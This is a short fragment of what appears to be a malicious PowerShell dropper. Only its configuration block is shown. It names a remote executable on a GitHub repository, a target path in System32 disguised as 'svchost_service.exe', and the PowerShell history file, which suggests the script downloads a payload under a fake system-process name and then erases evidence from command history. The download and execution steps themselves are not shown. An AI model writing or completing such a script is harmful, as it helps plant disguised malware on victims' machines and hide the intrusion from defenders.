...
# --- CONFIGURATION ---
$url = "https://raw.githubusercontent.com/punvertwo-sys/DLL/refs/heads/main/host2.exe"
$path = "C:\Windows\System32\svchost_service.exe"
$history = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
